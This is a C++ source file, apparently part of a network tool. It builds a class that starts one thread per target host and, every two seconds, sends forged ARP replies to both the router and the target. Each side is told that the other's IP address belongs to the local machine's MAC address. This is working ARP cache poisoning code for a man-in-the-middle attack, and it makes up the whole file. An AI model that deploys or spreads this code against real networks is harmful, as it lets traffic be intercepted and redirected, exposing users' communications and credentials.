#include "forwardpackage.h"

#include <iostream>
#include <string.h>

#include <pcapwrapper/controller.hpp>
#include <pcapwrapper/interfaces/interface.h>
#include <pcapwrapper/processors/processor.h>
#include <pcapwrapper/network/packages/arppackage.h>
#include <pcapwrapper/network/builders/builder.h>
#include <pcapwrapper/network/builders/keys.h>

ForwardPackage::ForwardPackage(PCAP::IpAddress local_ip,
                   PCAP::MacAddress local_mac,
                   PCAP::IpAddress router_ip,
                   PCAP::MacAddress router_mac,
                   const std::string& interface_name)
    : m_local_ip{local_ip}
    , m_local_mac{local_mac}
    , m_router_ip{router_ip}
    , m_router_mac{router_mac}
    , m_interface_name{interface_name}
{

}

auto ForwardPackage::get_flags(PCAP::IpAddress target_ip, PCAP::MacAddress target_mac) {
    return std::find_if(std::begin(m_flags), std::end(m_flags),
                        [&target_ip, &target_mac](auto& flag){ return flag.m_target_ip == target_ip && flag.m_target_mac == target_mac;});
}

void ForwardPackage::newClient(PCAP::IpAddress target_ip, PCAP::MacAddress target_mac) {
    auto it = std::find_if(m_packages.begin(), m_packages.end(), [&target_mac, &target_ip](auto& a)
                           {  return std::get<1>(a) == target_mac && std::get<0>(a) == target_ip; });
    if (it == m_packages.end()) {
        std::lock_guard<std::mutex> m_lock(m_mutex);
        std::cout << "Starting new thread " << target_ip.to_string() << " " << target_mac.to_string() << std::endl;
        m_packages.emplace_back(std::make_tuple(target_ip, target_mac));
        m_flags.emplace_back(target_ip, target_mac);
        m_threads.emplace_back(std::make_unique<std::thread>(&ForwardPackage::workingFunction, this, target_ip, target_mac));
    }
}

void ForwardPackage::stopClient(PCAP::IpAddress target_ip, PCAP::MacAddress target_mac) {
    auto it = get_flags(target_ip, target_mac);
    if (it != std::end(m_flags)) {
        it->m_stop = true;
    } else {
        std::cout << "Package doesn't exist in flags" << std::endl;
    }

    {
        std::lock_guard<std::mutex> m_lock(m_mutex);
        std::cout << "Stoping a thread " << target_ip.to_string() << " " << target_mac.to_string() << std::endl;
        m_packages.erase(std::remove_if(m_packages.begin(), m_packages.end(), [&target_ip, &target_mac](auto& p){
            return target_ip == std::get<0>(p) && target_mac == std::get<1>(p);
        }), m_packages.end());
        m_flags.erase(std::remove_if(m_flags.begin(), m_flags.end(),[&target_ip, &target_mac](auto& f){
            return target_ip == f.m_target_ip && target_mac == f.m_target_mac;
        }), m_flags.end());
        std::cout << "Package size: " << m_packages.size() << std::endl;
    }
}

void ForwardPackage::stop() {
    {
        std::lock_guard<std::mutex> m_lock(m_mutex);
        for( auto& f : m_flags) {
            f.m_stop = true;
        }
    }
    for (auto& t : m_threads) {
        t->join();
    }
}

bool ForwardPackage::is_stop(PCAP::IpAddress target_ip, PCAP::MacAddress target_mac) {
    std::lock_guard<std::mutex> m_lock(m_mutex);
    auto it = get_flags(target_ip, target_mac);
    if (it != std::end(m_flags)) {
        return it->m_stop;
    }
    return true;
}

void ForwardPackage::workingFunction(PCAP::IpAddress target_ip, PCAP::MacAddress target_mac) {
    auto controller = PCAP::Controller<PCAP::Interface, PCAP::Processor>::getController(m_interface_name);

    while (!is_stop(target_ip, target_mac)) {

        using namespace PCAP::PCAPBuilder;
        auto package_router = PCAP::PCAPBuilder::make_apr(std::map<Keys, Option>{
                                                        {Keys::Key_Eth_Mac_Src, m_local_mac},
                                                        {Keys::Key_Eth_Mac_Dst, m_router_mac},
                                                        {Keys::Key_Arp_Mac_Src, m_local_mac},
                                                        {Keys::Key_Arp_Mac_Dst, m_router_mac},
                                                        {Keys::Key_Arp_Opcode, (unsigned char)0x02},
                                                        {Keys::Key_Ip_Src, target_ip},
                                                        {Keys::Key_Ip_Dst, m_router_ip}});

        auto package_target = PCAP::PCAPBuilder::make_apr(std::map<Keys, Option>{
                                                        {Keys::Key_Eth_Mac_Src, m_local_mac},
                                                        {Keys::Key_Eth_Mac_Dst, target_mac},
                                                        {Keys::Key_Arp_Mac_Src, m_local_mac},
                                                        {Keys::Key_Arp_Mac_Dst, target_mac},
                                                        {Keys::Key_Arp_Opcode, (unsigned char)0x02},
                                                        {Keys::Key_Ip_Src, m_router_ip},
                                                        {Keys::Key_Ip_Dst, target_ip}});

        controller->write(package_router.getPackage(), 60);
        controller->write(package_target.getPackage(), 60);

        using namespace std::chrono_literals;
        std::this_thread::sleep_for(2s);
    }
}
